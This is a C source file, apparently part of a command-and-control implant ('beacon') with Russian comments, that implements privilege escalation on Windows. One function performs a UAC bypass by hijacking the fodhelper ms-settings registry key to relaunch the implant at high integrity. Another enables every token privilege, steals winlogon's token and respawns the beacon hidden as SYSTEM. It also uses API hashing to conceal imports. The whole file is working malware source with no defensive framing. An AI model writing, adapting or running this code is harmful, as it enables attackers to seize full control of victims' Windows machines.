#include "../core/beacon.h"
#include <shellapi.h>

typedef DWORD (WINAPI *PFN_WTSGetActiveConsoleSessionId)(void);

#define TH32CS_SNAPPROCESS 0x00000002
typedef struct tagPROCESSENTRY32 {
    DWORD     dwSize;
    DWORD     cntUsage;
    DWORD     th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD     th32ModuleID;
    DWORD     cntThreads;
    DWORD     th32ParentProcessID;
    LONG      pcPriClassBase;
    DWORD     dwFlags;
    char      szExeFile[MAX_PATH];
} PROCESSENTRY32, *PPROCESSENTRY32;

HANDLE WINAPI CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
BOOL   WINAPI Process32First(HANDLE hSnapshot, PROCESSENTRY32* lppe);
BOOL   WINAPI Process32Next(HANDLE hSnapshot, PROCESSENTRY32* lppe);

static int cmp_proc_name(const char* a, const char* b) {
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? (*a + 32) : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? (*b + 32) : *b;
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return (*a) - (*b);
}

// Включает все привилегии текущего процесса (аналог EnableAllPrivileges из POC)
static void enable_all_privileges(void) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return;

    DWORD needed = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &needed);
    if (!needed) { CloseHandle(token); return; }

    TOKEN_PRIVILEGES* tp = (TOKEN_PRIVILEGES*)bmalloc(needed);
    if (!tp) { CloseHandle(token); return; }

    if (GetTokenInformation(token, TokenPrivileges, tp, needed, &needed)) {
        for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
            TOKEN_PRIVILEGES single;
            single.PrivilegeCount = 1;
            single.Privileges[0].Luid = tp->Privileges[i].Luid;
            single.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(token, FALSE, &single, sizeof(single), NULL, NULL);
        }
    }

    bfree(tp);
    CloseHandle(token);
}

static DWORD find_pid(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (cmp_proc_name(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// UAC bypass: ms-settings fodhelper registry hijack
// fodhelper запускает текущий EXE заново с High Integrity → новая сессия на сервере
void cmd_privesc_admin(const BeaconTask* t) {
    (void)t;

    HKEY key;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\Shell\\Open\\command",
            0, NULL, 0, KEY_SET_VALUE, NULL, &key, NULL) != ERROR_SUCCESS)
        return;

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, sizeof(self_path));

    char cmd[MAX_PATH + 2];
    cmd[0] = '"';
    DWORD i = 1;
    for (DWORD j = 0; self_path[j]; ++j) cmd[i++] = self_path[j];
    cmd[i++] = '"';
    cmd[i] = 0;

    RegSetValueExA(key, NULL, 0, REG_SZ, (BYTE*)cmd, i + 1);
    RegSetValueExA(key, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(key);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "open";
    sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow  = SW_HIDE;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    } else {
        Sleep(3000);
    }

    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
}

// SYSTEM escalation: winlogon token theft → новый экземпляр бикона как SYSTEM
void cmd_privesc_system(const BeaconTask* t) {
    (void)t;

    // Включаем все привилегии (SeDebugPrivilege + SeImpersonatePrivilege и др.)
    enable_all_privileges();

    DWORD pid = find_pid("winlogon.exe");
    if (!pid) return;

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!process) return;

    HANDLE token = NULL;
    if (!OpenProcessToken(process, TOKEN_DUPLICATE | TOKEN_QUERY, &token)) {
        CloseHandle(process);
        return;
    }
    CloseHandle(process);

    HANDLE system_token = NULL;
    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL,
            SecurityImpersonation, TokenPrimary, &system_token)) {
        CloseHandle(token);
        return;
    }
    CloseHandle(token);

    PFN_WTSGetActiveConsoleSessionId pfnWTS =
        (PFN_WTSGetActiveConsoleSessionId)api_resolve(
            api_hash_w(L"kernel32.dll"),
            api_hash("WTSGetActiveConsoleSessionId"));
    DWORD session_id = pfnWTS ? pfnWTS() : 0;
    SetTokenInformation(system_token, TokenSessionId, &session_id, sizeof(session_id));

    wchar_t self_wpath[MAX_PATH];
    GetModuleFileNameW(NULL, self_wpath, MAX_PATH);

    STARTUPINFOW siw = {0};
    siw.cb        = sizeof(siw);
    siw.lpDesktop = L"winsta0\\default";
    siw.dwFlags   = STARTF_USESHOWWINDOW;
    siw.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    CreateProcessWithTokenW(system_token, 0,
        self_wpath, NULL, CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);

    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(system_token);
}
